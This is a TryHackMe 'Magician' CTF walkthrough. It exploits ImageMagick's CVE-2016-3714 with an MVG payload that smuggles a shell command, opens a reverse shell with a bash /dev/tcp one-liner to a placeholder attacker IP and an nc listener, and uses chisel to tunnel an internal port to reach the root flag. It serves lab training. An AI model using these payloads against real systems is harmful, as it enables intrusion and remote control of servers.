@@ -1,0 +1,116 @@
+I"M<h2 id="introduction">Introduction</h2>
+<p>This is partical room from tryhackme entitled “Magician” with Easy difficulty. In this room we will learn about Exploitation RCE with multiple vulnerabilities in ImageMagick from CVE-2016–3714 and Tunneling port. We will doing to getting shell from web then tunneling listening port to getting another web which contain root flag. Link room <a href="https://tryhackme.com/room/magician">here</a></p>
+
+<h2 id="scanning">Scanning</h2>
+
+<h3 id="nmap">Nmap</h3>
+
+<pre><code class="language-bash">$ nmap -sC -sV -oA nmap/nmap 10.10.74.239
+Nmap scan report for 10.10.74.239
+Host is up (0.37s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.0.8 or later
+8081/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: magician
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Feb 23 17:27:16 2021 -- 1 IP address (1 host up) scanned in 37.43 seconds
+</code></pre>
+<p>We just have 2 port open like FTP and Webservice (nginx). now i want to try login ftp with anonymous login.</p>
+
+<p><img src="/assets/thm_magician/bg_1.png" alt="img" /></p>
+
+<p>As you can see we can’t let in but there is have some hint for us. I’m going to https://imagetragick.com which is POC of CVE-2016–3714. Now before going to web we must put host in /etc/hosts.</p>
+<pre><code class="language-bat">127.0.0.1       localhost
+127.0.1.1       Razor
+
+# CTF
+10.10.74.239 magician
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre>
+
+<p><img src="/assets/thm_magician/bg_2.png" alt="img" /></p>
+
+<p>I’m trying to using burpsuite and test POC from imagetragick which we found before.</p>
+
+<p><img src="/assets/thm_magician/bg_3.png" alt="img" /></p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>then i’m try to following POC from imagetragick and checking with ping back to my ip using tcpdump <code>$ sudo tcpdump -i tun0 host magician and -n icmp</code>.</p>
+
+<pre><code class="language-bat">push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.0/oos.jpg";ping -c5 10.2.47.251")'
+pop graphic-context
+</code></pre>
+
+<p><img src="/assets/thm_magician/bg_4.png" alt="img" /></p>
+
+<h3 id="getting-shell">Getting Shell</h3>
+
+<p>And its works. i got ping back from web, So we can create revershell with <code>bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</code> then prepare for revershell with nc <code>nc -lvnp &lt;PORT&gt;</code></p>
+
+<p><img src="/assets/thm_magician/bg_5.png" alt="img" /></p>
+
+<p>Now i got shell, then let’s make it shell to real shell .</p>
+
+<p><img src="/assets/thm_magician/bg_6.png" alt="img" /></p>
+
+<h2 id="flag-usertxt">Flag User.txt</h2>
+
+<p>As you can see we got user magician and let’s take the flag :D</p>
+
+<pre><code class="language-bash">magician@magician:~$ cd /home/magician/
+magician@magician:~$ cat user.txt 
+THM{s----REDACTED----x}
+magician@magician:~$ 
+</code></pre>
+
+<p>There is have some files namely <code>the_magic_continues</code> , let’s take a look the file :</p>
+
+<p><img src="/assets/thm_magician/bg_7.png" alt="img" /></p>
+
+<p>There is give me some hint again then let’s take a look port on This machines <code>(netstat -punta || ss --ntpu) | grep "127"</code>.</p>
+
+<p><img src="/assets/thm_magician/bg_8.png" alt="img" /></p>
+
+<p>There are many methods we can use to tunnel the port. In this case I will use chisel and you can download that in <a href="https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz">here</a>, Then uploaded to machine.</p>
+
+<p><img src="/assets/thm_magician/bg_9.png" alt="img" /></p>
+
+<p>Now we can setup the Chisel :</p>
+<ul>
+  <li>First create server reverse port to tunneling port <code>./chisel server --reverse --port 4242</code>.
+<img src="/assets/thm_magician/bg_10.png" alt="img" /></li>
+  <li>Then create client on machines and setting R port to 6969 for access in web “localhost:6969” <code>./chisel client 10.2.47.251:4242 R:6969:localhost:6666</code>.
+<img src="/assets/thm_magician/bg_11.png" alt="img" /></li>
+</ul>
+
+<p>Now we done for setup tunneling localhost:6666 to localhost:6969(In My Machine). Now let’s take a look the browser</p>
+
+<p><img src="/assets/thm_magician/bg_12.png" alt="img" /></p>
+
+<p>Then just type <code>/root/root.txt</code></p>
+
+<p><img src="/assets/thm_magician/bg_13.png" alt="img" /></p>
+
+<h2 id="flag-roottxt">Flag Root.txt</h2>
+
+<p>There is a Binary and we can convert to ASCII</p>
+
+<p><img src="/assets/thm_magician/bg_14.png" alt="img" /></p>
+
+<p>Then we have flag for root not :D</p>
+
+<p>so that’s all the writeup that I made, now we have user flag and root flag.</p>
+
+<p>Happy hacking :D</p>
+:ET
